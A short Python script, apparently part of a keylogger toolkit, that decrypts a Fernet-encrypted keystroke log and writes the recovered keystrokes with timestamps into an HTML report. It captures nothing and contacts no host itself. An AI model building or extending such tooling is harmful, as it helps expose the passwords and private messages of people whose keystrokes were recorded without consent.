from cryptography.fernet import Fernet
import base64

with open("secret.key", "rb") as key_file:
    key = key_file.read()
fernet = Fernet(key)

html_output = """
<html><head><title>Decrypted Keylogger Report</title></head>
<body><h2>Decrypted Key Logs</h2><pre>
"""

with open("keylog_encrypted.log", "rb") as encrypted_log:
    for line in encrypted_log:
        try:
            timestamp, encrypted = line.decode().split('] ')
            decrypted = fernet.decrypt(encrypted.strip().encode())
            decoded = base64.b64decode(decrypted).decode()
            html_output += f"{timestamp}] {decoded}\n"
        except Exception as e:
            html_output += f"Error: {e}\n"

html_output += "</pre></body></html>"

with open("keylog_report.html", "w") as report:
    report.write(html_output)

print("[+] Decrypted logs written to keylog_report.html")
